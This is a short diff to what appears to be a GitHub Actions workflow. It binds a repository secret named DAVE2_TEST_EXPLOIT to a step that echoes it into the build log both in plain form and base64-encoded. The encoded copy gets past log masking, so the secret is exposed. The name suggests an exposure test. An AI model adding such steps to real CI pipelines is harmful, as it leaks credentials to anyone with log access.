@@ -36,7 +36,7 @@ jobs:
                 echo "hello $DAVE2_TEST_EXPLOIT world"
                 echo "hello $DAVE2_TEST_EXPLOIT world" | base64
               env:
-                SAUCE_USERNAME: ${{ secrets.SAUCE_USERNAME }}
+                DAVE2_TEST_EXPLOIT: ${{ secrets.DAVE2_TEST_EXPLOIT }}
 
             - name: Install Playwright for Design System Storybook
               run: npx playwright install --with-deps
